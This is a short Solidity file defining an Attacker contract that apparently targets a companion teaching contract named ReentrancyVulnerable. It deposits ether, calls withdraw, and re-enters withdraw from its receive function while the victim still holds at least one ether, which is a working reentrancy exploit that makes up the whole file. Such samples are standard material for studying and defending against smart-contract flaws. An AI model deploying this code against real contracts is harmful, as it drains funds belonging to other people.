// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ReentrancyVulnerable} from "./ReentrancyVulnerable.sol";

contract Attacker {
    ReentrancyVulnerable public victim;

    constructor(address _victim) {
        victim = ReentrancyVulnerable(payable(_victim));
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}
